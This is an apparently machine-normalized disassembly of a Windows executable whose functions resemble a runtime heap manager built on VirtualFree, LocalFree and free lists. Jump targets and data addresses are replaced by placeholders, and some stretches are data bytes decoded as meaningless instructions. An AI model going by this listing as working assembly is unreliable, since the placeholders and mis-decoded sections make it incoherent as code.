sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031ac
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x28004010 ]
xor eax [ eax ]
jo r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
mov eax 0x8b0046b1
sar bh 0x25
nop
mov cl 0x46
add [ ebx - 0x73da0040 ] cl
mov cl 0x46
add [ ebx - 0x77da0040 ] cl
mov cl 0x46
add [ ebx - 0x4bda0040 ] cl
mov cl 0x46
add [ ebx - 0x7bda0040 ] cl
mov cl 0x46
add [ ebx - 0x7fda0040 ] cl
mov cl 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov cl 0x46
add [ ebx + 0x7825ffc0 ] cl
mov cl 0x46
add [ ebx + 0x7425ffc0 ] cl
mov cl 0x46
add [ ebx + 0x7025ffc0 ] cl
mov cl 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov cl 0x46
add [ ebx + 0x6825ffc0 ] cl
mov cl 0x46
add [ ebx + 0x6425ffc0 ] cl
mov cl 0x46
add [ ebx + 0x6025ffc0 ] cl
mov cl 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov cl 0x46
add [ ebx - 0x4fda0040 ] cl
mov cl 0x46
add [ ebx + 0x5825ffc0 ] cl
mov cl 0x46
add [ ebx + 0x5425ffc0 ] cl
mov cl 0x46
add [ ebx + 0x5025ffc0 ] cl
mov cl 0x46
add [ ebx - 0x37da0040 ] cl
mov cl 0x46
add [ ebx - 0x3bda0040 ] cl
mov cl 0x46
add [ ebx - 0x3fda0040 ] cl
mov cl 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov cl 0x46
add [ ebx + 0x4825ffc0 ] cl
mov cl 0x46
add [ ebx - 0x27da0040 ] cl
mov cl 0x46
add [ ebx - 0x2bda0040 ] cl
mov cl 0x46
add [ ebx - 0x2fda0040 ] cl
mov cl 0x46
add [ ebx + 0x4425ffc0 ] cl
mov cl 0x46
add [ ebx + 0x4025ffc0 ] cl
mov cl 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov cl 0x46
add [ ebx + 0x3825ffc0 ] cl
mov cl 0x46
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
inc eax
add [ ebp + edx * 2 + 0x40 ] bh
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
mov [ ebp + 0x40 ] ss
add [ eax + esi + 0x30e80040 ] ch
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
xor [ ecx - 0x3f74ffba ] 0xff
and eax __import_lookup_table_0(kernel32:FreeLibrary)
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403918
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403918
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
